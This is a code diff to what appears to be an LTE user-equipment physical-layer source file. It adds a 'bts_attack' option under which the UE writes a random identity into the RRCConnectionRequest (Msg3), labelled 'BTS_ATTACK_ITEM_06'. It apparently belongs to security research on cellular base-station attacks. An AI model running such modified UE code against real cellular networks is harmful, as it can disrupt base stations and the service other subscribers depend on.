@@ -63,10 +63,19 @@
 
 #include "PHY/TOOLS/tools_defs.h"
 
+// to support attacks CLI options
+#include "attack_extern.h"      /* bts_attack */
+
+#include <stdlib.h>     /* srand () and rand () for bts_attack */
+#include <arpa/inet.h>	// htonl ()
+#include <stdint.h>	// uint_8, uint_32
+#include <string.h>	// memcpy ()
+
 #define DLSCH_RB_ALLOC 0x1fbf  // skip DC RB (total 23/25 RBs)
 #define DLSCH_RB_ALLOC_12 0x0aaa  // skip DC RB (total 23/25 RBs)
 
 #define NS_PER_SLOT 500000
+
 
 static const char mode_string[4][20] = {"NOT SYNCHED","PRACH","RAR","PUSCH"};
 
@@ -1539,7 +1548,23 @@ void ue_ulsch_uespec_procedures(PHY_VARS_UE *ue,
     }
 
     if (Msg3_flag == 1) {
-      LOG_I(PHY,"[UE  %d][RAPROC] Frame %d, Subframe %d Generating (RRCConnectionRequest) Msg3 (nb_rb %d, first_rb %d, round %d, rvidx %d) Msg3: %x.%x.%x|%x.%x.%x.%x.%x.%x\n",Mod_id,frame_tx,
+      if (bts_attack >= 200) {
+	union {
+	  uint8_t  _uint8[4];
+	  uint32_t _uint32;
+	} rand_ID;
+
+        srand(frame_tx);
+	
+	rand_ID._uint32 = rand () & 0xFFFFFFFF;
+
+	LOG_E(PHY, "[BTS_ATTACK_ITEM_06]: Assign random ID (0x%08x) to Msg3 bytes 5-8\n",
+	      htonl (rand_ID._uint32));
+	  // assign random value to random identity, otherwise the UE will always pickup the last RV
+	(void *) memcpy (ue->prach_resources[eNB_id]->Msg3 + 4, rand_ID._uint8, sizeof (uint32_t));
+      }
+
+      LOG_I(PHY,"[UE  %d][RAPROC] Frame %d, Subframe %d Generating (RRCConnectionRequest) Msg3 (nb_rb %d, first_rb %d, round %d, rvidx %d) Msg3: %02x.%02x.%02x|%02x.%02x.%02x.%02x.%02x.%02x\n",Mod_id,frame_tx,
             subframe_tx,
             ue->ulsch[eNB_id]->harq_processes[harq_pid]->nb_rb,
             ue->ulsch[eNB_id]->harq_processes[harq_pid]->first_rb,
@@ -2995,6 +3020,8 @@ void ue_pmch_procedures(PHY_VARS_UE *ue,
 
 void copy_harq_proc_struct(LTE_DL_UE_HARQ_t *harq_processes_dest,
                            LTE_DL_UE_HARQ_t *current_harq_processes) {
+  init_abort(&harq_processes_dest->abort_decode);
+  set_abort(&harq_processes_dest->abort_decode, check_abort(&current_harq_processes->abort_decode));
   harq_processes_dest->B              = current_harq_processes->B              ;
   harq_processes_dest->C              = current_harq_processes->C              ;
   harq_processes_dest->Cminus         = current_harq_processes->Cminus         ;
